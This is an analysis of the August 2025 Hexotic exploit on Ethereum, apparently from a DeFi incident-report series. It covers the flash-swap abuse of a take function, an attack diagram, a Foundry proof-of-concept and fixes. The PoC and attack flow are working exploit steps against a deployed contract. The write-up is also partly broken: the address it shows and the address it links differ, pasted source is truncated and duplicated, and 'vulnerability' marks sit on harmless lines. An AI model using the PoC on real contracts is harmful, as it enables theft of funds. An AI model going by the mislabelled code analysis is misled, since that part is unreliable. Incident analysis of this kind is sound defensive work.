# Hexotic — Flash Swap-Based `take` Function Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-25 |
| **Protocol** | Hexotic |
| **Chain** | Ethereum |
| **Loss** | ~500 USD |
| **Attacker** | [0x07185a9e74f8dceb7d6487400e4009ff76d1af46](https://etherscan.io/address/0x07185a9e74f8dceb7d6487400e4009ff76d1af46) |
| **Attack Tx** | [0x23b69bef...](https://etherscan.io/tx/0x23b69bef57656f493548a5373300f7557777f352ade8131353ff87a1b27e2bb3) |
| **Vulnerable Contract** | [0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1](https://arbiscan.io/address/0x03339ecae41bc162dacae5c2a275c8f64d6c80a0) |
| **Root Cause** | The `take` function allows unauthorized profit extraction using HEX tokens obtained via flash swap |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/Hexotic_exp.sol) |

---

## 1. Vulnerability Overview

The `take` function of the Hexotic contract accepts a specific ID and executes internal logic, allowing extraction of certain profits predicated on holding HEX tokens. The attacker borrowed HEX tokens via a flash swap from the UniswapV3 HEX pool, called `take` twice to realize the arbitrage profit, then repaid the pool in WETH. The loss was approximately 500 USD — a small amount — but the vulnerable pattern is clear.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: take function only checks instantaneous HEX balance
interface IHexotic {
    function take(bytes32 id) external payable;
    // Internally calculates profit based on msg.sender's HEX balance
    // Can be called after temporarily holding balance via flash swap
}

// ✅ Recommended fix: balance snapshot or staking-based verification
// Verify holding history over a period of time, not balance at call time
function take(bytes32 id) external payable {
    require(stakedBalance[msg.sender] >= minimumStake, "insufficient stake");
    require(block.timestamp - stakeTime[msg.sender] >= lockPeriod, "not locked long enough");
    ...
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: hex-otc.sol
contract EventfulMarket {
    );

    event LogTake(
        bytes32           id,
        address  indexed  maker,
        address  indexed  taker,  // ❌ vulnerability
        uint          take_amt,
        uint           give_amt,
        uint64            timestamp,
        uint              escrowType
    );

    event LogKill(
        bytes32  indexed  id,
        address  indexed  maker,
        uint           pay_amt,
        uint           buy_amt,
        uint64            timestamp,
        uint              escrowType
    );
}
```

```solidity
// File: erc20.sol
contract ERC20 {
contract ERC20 is ERC20Events {
    function totalSupply() public view returns (uint);  // ❌ vulnerability
    function balanceOf(address guy) public view returns (uint);
    function allowance(address src, address guy) public view returns (uint);

    function approve(address guy, uint wad) public returns (bool);
    function transfer(address dst, uint wad) public returns (bool);
    function transferFrom(
        address src, address dst, uint wad
    ) public returns (bool);
}
```

```solidity
// File: math.sol
contract DSMath {
contract DSMath {
    function add(uint x, uint y) internal pure returns (uint z) {  // ❌ vulnerability
        require((z = x + y) >= x);
    }
    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x);
    }
    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }

    function min(uint x, uint y) internal pure returns (uint z) {
        return x <= y ? x : y;
    }
    function max(uint x, uint y) internal pure returns (uint z) {
        return x >= y ? x : y;
    }
    function imin(int x, int y) internal pure returns (int z) {
        return x <= y ? x : y;
    }
    function imax(int x, int y) internal pure returns (int z) {
        return x >= y ? x : y;
    }

    uint constant WAD = 10 ** 18;
    uint constant RAY = 10 ** 27;

    function wmul(uint x, uint y) internal pure returns (uint z) {
        z = add(mul(x, y), WAD / 2) / WAD;
    }
    function rmul(uint x, uint y) internal pure returns (uint z) {
        z = add(mul(x, y), RAY / 2) / RAY;
    }
    function wdiv(uint x, uint y) internal pure returns (uint z) {
        z = add(mul(x, WAD), y / 2) / y;
    }
    function rdiv(uint x, uint y) internal pure returns (uint z) {
        z = add(mul(x, RAY), y / 2) / y;
    }

    // This famous algorithm is called "exponentiation by squaring"
    // and calculates x^n with x as fixed-point and n as regular unsigned.
    //
    // It's O(log n), instead of O(n) for naive repeated multiplication.
    //
    // These facts are why it works:
    //
    //  If n is even, then x^n = (x^2)^(n/2).
    //  If n is odd,  then x^n = x * x^(n-1),
    //   and applying the equation for even x gives
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Prepare 0.037 WETH (for pool repayment)
  │
  ├─[2]─▶ Flash swap from UniswapV3 HEX/WETH pool
  │         └─ Borrow large amount of HEX tokens
  │
  ├─[3]─▶ HEX.approve(hexotic, max)
  │
  ├─[4]─▶ Call hexotic.take(0x...0043) (first ID)
  │         └─ Receive profit based on HEX holdings
  │
  ├─[5]─▶ Call hexotic.take(0x...002b) (second ID)
  │         └─ Receive additional profit
  │
  └─[6]─▶ Repay flash swap in WETH via uniswapV3SwapCallback
              └─ Retain ~500 USD profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public balanceLog {
    // [1] Obtain 0.1 ETH and wrap into WETH
    vm.deal(address(this), 0.1 ether);
    WETH.deposit{value: 0.037 ether}();

    // [2] Initiate flash swap from UniswapV3 HEX/WETH pool
    // false = direction to receive token1 (HEX), specify max price range for pool
    IPancakeV3Pool(uniswapV3HEXPool).swap(
        address(this),
        false,
        37000000000000000,           // HEX borrow amount
        1461446703485210103287273052203988822378723970341, // sqrtPriceLimitX96 max
        "0x00"
    );

    // [3] Call Hexotic take function with borrowed HEX (executed inside callback)
    hexToken.approve(address(hexotic), type(uint256).max);

    // [4] Call take function with two IDs to extract profit
    hexotic.take(0x0000000000000000000000000000000000000000000000000000000000000043);
    hexotic.take(0x000000000000000000000000000000000000000000000000000000000000002b);
}

// Flash swap callback: repay in WETH
function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
    WETH.transfer(address(uniswapV3HEXPool), 37000000000000000); // Repay WETH
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Instantaneous balance-based authorization bypass |
| **Attack Vector** | UniswapV3 flash swap + `take` function |
| **Impact Scope** | Protocol profit theft |
| **CWE** | CWE-362: Race Condition / Time-of-Check Time-of-Use |
| **DASP Classification** | Price Manipulation / Flash Loan |

## 6. Remediation Recommendations

1. **Staking-based authorization**: Restrict `take` call privileges to users who have staked tokens for a minimum period.
2. **Block-based balance snapshot**: Calculate authorization based on balance at a specific past block to prevent flash loan bypass.
3. **Minimum holding period requirement**: Require a verifiable history of holding tokens for a set duration before `take` can be called.
4. **Call rate limiting**: Restrict repeated `take` calls from the same address by enforcing a time interval between calls.

## 7. Lessons Learned

- Any function that grants authorization based on "current balance" is vulnerable to flash loan attacks.
- Even with small losses, a flawed design pattern can lead to far greater damage in forked protocols with larger TVL.
- Token holding-based authorization must be combined with snapshots or time-locks to be secure.